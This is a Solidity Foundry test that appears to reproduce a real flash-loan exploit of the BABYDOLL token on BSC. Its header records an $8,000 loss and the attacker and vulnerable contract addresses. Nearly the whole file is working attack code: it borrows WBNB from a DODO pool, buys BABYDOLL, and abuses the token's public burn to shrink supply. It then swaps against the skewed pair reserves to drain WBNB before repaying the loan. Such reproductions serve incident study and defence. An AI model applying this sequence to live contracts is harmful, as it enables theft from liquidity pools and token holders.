// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IPancakePair.sol";
import "./interface/IWBNB.sol";
import "./interface/IDODO.sol";
import "./interface/IERC20.sol";
import "./interface/IPancakeRouter02.sol";

// Total Lost: 8,000 US$
// Chain: BSC
// Attacker: 0xebc58c96cef9fc91a4ae049f026f8076198e5f83
// Attack Contract: 0x45134142cc02e722b782a092f34fa1e15b6c2859
// Attack Tx: 0x449cfecbc8e8469eeda869fca6cccd326ece0c04a1cdd96b23d21f3b599adee2
// Vulnerable Contract: 0xb263ba5d623a533d4c1a5de262f287998c368f58

// Pre tx:
interface sappToken {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function FeeAddress() external view returns (address);

    function _BURN_FEE() external view returns (uint256);

    function _CHARITY_FEE() external view returns (uint256);

    function _TAX_FEE() external view returns (uint256);

    function _owner() external view returns (address);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function burn(uint256 _value) external;

    function decimals() external view returns (uint256);

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

    function deliver(uint256 tAmount) external;

    function excludeAccount(address account) external;

    function includeAccount(address account) external;

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

    function isCharity(address account) external view returns (bool);

    function isExcluded(address account) external view returns (bool);

    function isMint() external view returns (bool);

    function mint(address account, uint256 amount) external;

    function name() external view returns (string memory);

    function owner() external view returns (address);

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);

    function renounceOwnership() external;

    function setAsCharityAccount(address account) external;

    function set_require_token(address token) external;

    function startMint() external;

    function symbol() external view returns (string memory);

    function tokenFromReflection(uint256 rAmount) external view returns (uint256);

    function totalBurn() external view returns (uint256);

    function totalCharity() external view returns (uint256);

    function totalFees() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function transferOwnership(address newOwner) external;

    function updateFee(uint256 _txFee, uint256 _burnFee, uint256 _charityFee) external;
}

contract BABYDOLLExp is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IPancakeRouter02 constant PancakeRouterv2 = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDODO constant flashLoanPool = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);

    IPancakePair constant WBNB_BABYDOLL_Pair = IPancakePair(0x4465e7eb70743bF14D1d669e9230707775009e9f);
    sappToken constant BABYDOLL = sappToken(0xb263bA5D623A533D4c1A5DE262f287998C368f58);

    function setUp() public {
        cheat.createSelectFork("bsc", 25_777_846);
    }

    function testAttack() public {
        uint256 balance = wbnb.balanceOf(address(flashLoanPool));
        console2.log("Before attack, WBNB balance of pair: ", balance);
        flashLoanPool.flashLoan(balance, 0, address(this), "0x00");
    }

    //Note: CallBack function exeBABYDOLLd by DODOV2(DVM) flashLoan pool
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    //Note: CallBack function exeBABYDOLLd by DODOV2(DPP) flashLoan pool
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    //Note: CallBack function exeBABYDOLLd by DODOV2(DSP) flashLoan pool
    function DSPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    function _flashLoanCallBack(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data)
        internal
    {
        console2.log("In Flashloan ...");
        console2.log("After Flashloan,  WBNB balance of this: ", wbnb.balanceOf(address(this)) / 1e18);
        console2.log("BABYDOLL balance of pair: ", BABYDOLL.balanceOf(address(WBNB_BABYDOLL_Pair)));
        console2.log("BABYDOLL balance of this: ", BABYDOLL.balanceOf(address(this)));
        uint256 totalSupply = BABYDOLL.totalSupply();
        console2.log("The totalSupply of BABYDOLL: ", totalSupply);

        console2.log("swap... ");
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(BABYDOLL);
        BABYDOLL.approve(address(PancakeRouterv2), BABYDOLL.balanceOf(address(this)));
        wbnb.approve(address(PancakeRouterv2), wbnb.balanceOf(address(this)));
        PancakeRouterv2.swapTokensForExactTokens(1, baseAmount, path, address(this), block.timestamp);

        console2.log("After swap, BABYDOLL balance of pair: ", BABYDOLL.balanceOf(address(WBNB_BABYDOLL_Pair)));
        console2.log("After swap, BABYDOLL balance of this: ", BABYDOLL.balanceOf(address(this)));

        totalSupply = BABYDOLL.totalSupply();
        console2.log("The totalSupply of BABYDOLL: ", totalSupply);

        BABYDOLL.burn(totalSupply - 7_000_000);
        console2.log("After burn, BABYDOLL balance of pair: ", BABYDOLL.balanceOf(address(WBNB_BABYDOLL_Pair)));
        console2.log("After burn, BABYDOLL balance of this: ", BABYDOLL.balanceOf(address(this)));

        (uint256 reserve0, uint256 reserve1,) = WBNB_BABYDOLL_Pair.getReserves();
        console2.log("After burn, BABYDOLL balance of pair: ", BABYDOLL.balanceOf(address(WBNB_BABYDOLL_Pair)));
        console2.log("After burn, BABYDOLL balance of this: ", BABYDOLL.balanceOf(address(this)));

        uint256 amountOut =
            PancakeRouterv2.getAmountOut(BABYDOLL.balanceOf(address(WBNB_BABYDOLL_Pair)) - reserve0, reserve0, reserve1);

        WBNB_BABYDOLL_Pair.swap(0, amountOut, address(this), "");

        console2.log("After swap, wbnb balance of pair: ", wbnb.balanceOf(address(WBNB_BABYDOLL_Pair)) / 1e18);
        console2.log("After swap, wbnb balance of this: ", wbnb.balanceOf(address(this)) / 1e18);

        //Return funds
        bool success = wbnb.transfer(address(flashLoanPool), baseAmount);
        if (success) {
            console2.log("Flashloan payback success");
            console2.log("After attack, wbnb balance of this: ", wbnb.balanceOf(address(this)) / 1e18);
        }
    }
}
